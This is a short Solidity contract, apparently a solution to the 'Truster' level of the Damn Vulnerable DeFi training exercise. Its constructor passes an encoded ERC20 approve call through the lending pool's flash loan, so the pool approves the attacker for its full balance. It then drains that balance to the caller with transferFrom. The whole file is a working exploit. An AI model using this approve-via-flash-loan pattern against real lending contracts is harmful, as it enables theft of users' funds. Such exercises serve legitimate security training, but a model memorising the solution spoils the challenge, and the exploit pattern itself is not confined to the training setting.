// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./TrusterLenderPool.sol";

contract AttackerTruster {
    constructor (address _token, address _pool) {
        uint balance = ERC20(_token).balanceOf(_pool);
        bytes memory data = abi.encodeWithSelector(ERC20.approve.selector, address(this), balance);
        TrusterLenderPool(_pool).flashLoan(0, msg.sender, _token, data);
        ERC20(_token).transferFrom(_pool, msg.sender, balance);
    }
}
